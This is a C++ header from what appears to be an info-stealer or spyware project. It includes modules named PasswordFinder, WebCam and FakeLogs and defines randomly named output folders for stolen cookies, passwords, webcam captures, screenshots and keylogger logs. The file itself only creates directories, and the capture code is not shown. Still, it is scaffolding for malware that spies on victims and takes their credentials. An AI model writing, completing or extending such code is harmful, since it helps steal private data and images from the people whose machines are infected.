#pragma once

#include <iostream>
#include <vector>

#include "Other/ResourceInfo.cpp"
#include "Other/FakeLogs.cpp"
#include "Other/RunningFileInfo.cpp"
#include "Other/DiskInfo.cpp"
#include "Other/Locate.cpp"
#include "Other/ComputerInfo.cpp"
#include "Other/PasswordFinder.cpp"

#include "Other/WebCam.cpp"

using namespace LogGen;

#define LogName LogGenerate(5) + " - " + LogGenerate(25)

const string Path = LogGenerate(5) + " - Main\\";

const string FindCookieFileFloder = Path + "Cookie\\";
const string WebCamFloder =			Path + "WebCam\\";
const string PassFindFloder =		Path + "FindPass\\";
const string ScreenShotFloder =		Path + "ScreenShot\\";
const string KeyLoggerFloder =		Path + "KeyLogger\\";

const string FloderInfo =			Path + "MagicFloder\\";

bool Create(const wstring& path) { return CreateDirectoryW(path.c_str(), nullptr) != FALSE; }

void CreateDirectory(string path)
{
	wstring_convert<codecvt_utf8_utf16<wchar_t>> converter;
	wstring wpath = converter.from_bytes(path);
	if (!Create(wpath)) { }
}